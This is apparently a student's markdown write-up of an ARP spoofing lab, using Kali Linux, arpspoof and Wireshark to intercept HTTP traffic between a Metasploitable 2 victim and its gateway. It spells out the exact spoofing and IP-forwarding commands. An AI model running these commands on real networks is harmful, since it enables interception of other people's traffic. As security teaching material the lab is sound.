## 📄 `Arp spoofing lab`

```
markdownCopyEdit# 🛡️ Network Security Lab – ARP Spoofing with Kali Linux & Wireshark

## ✅ Objective

Simulate a real-world **Man-in-the-Middle (MITM)** attack using **ARP Spoofing** to intercept and monitor traffic between a victim (Metasploitable) and the network gateway, using Kali Linux.

---

## 🧱 Network Setup

| Device           | Role       | IP Address       |
|------------------|------------|------------------|
| Kali Linux       | Attacker   | `192.168.1.182`  |
| Metasploitable 2 | Victim     | `192.168.1.184`  |
| Router/Modem     | Gateway    | `192.168.1.1`    |

🖧 Both machines were connected to the same **virtual network** using **Bridged Adapter**.

---

## 🧠 Step 1: Network Discovery

```bash
sudo netdiscover -r 192.168.1.0/24
```

* * *

## 🔧 Step 2: Enable IP Forwarding

```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

🎯 This allows Kali to forward packets between the victim and the gateway.

![Ip2](file:///C:/Users/moham/OneDrive/Desktop/Ip2.png)

* * *

## 💣 Step 3: Launch ARP Spoofing Attack

### ➤ Terminal 1:

```
sudo arpspoof -i eth0 -t 192.168.1.184 192.168.1.1
```

🌀 Spoofs the victim to believe that Kali is the gateway.

### ➤ Terminal 2:

```
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.184
```

🌀 Spoofs the gateway to believe that Kali is the victim.


![Ip4](file:///C:/Users/moham/OneDrive/Desktop/Ip4.png)
![Ip5](file:///C:/Users/moham/OneDrive/Desktop/Ip5.png)
* * *

## 👁️ Step 4: Capture Traffic with Wireshark

```
sudo wireshark
```

- Interface selected: `eth0`
- Filter applied:

    ```
    ip.addr == 192.168.1.184
    ```



* * *

## 📥 Step 5: Generate Traffic from Victim

### On Metasploitable:

```
telnet 192.168.1.1 80
```

Then manually send:

```
GET / HTTP/1.1
Host: 192.168.1.1
```

🔍 This created HTTP traffic visible in Wireshark.



* * *

## ✅ Outcome

- Successfully poisoned ARP tables using `arpspoof`
- Intercepted HTTP traffic from victim to gateway using `Wireshark`
- Demonstrated a real-world MITM scenario in a virtual environment

* * *

## 📝 Tools Used

- Kali Linux (Attacker)
- Metasploitable 2 (Victim)
- `arpspoof` from `dsniff`
- `Wireshark`
- `netdiscover`, `telnet`



## 🧠 Key Learning Outcome

> 
> 
> “ARP Spoofing is a fundamental technique used in Man-in-the-Middle attacks. This lab proved how attackers can manipulate ARP tables and monitor or modify traffic in a LAN environment.”
> 

* * *

✅ *This lab is a strong addition to a cybersecurity resume or portfolio under **Network Security / Penetration Testing** section.*

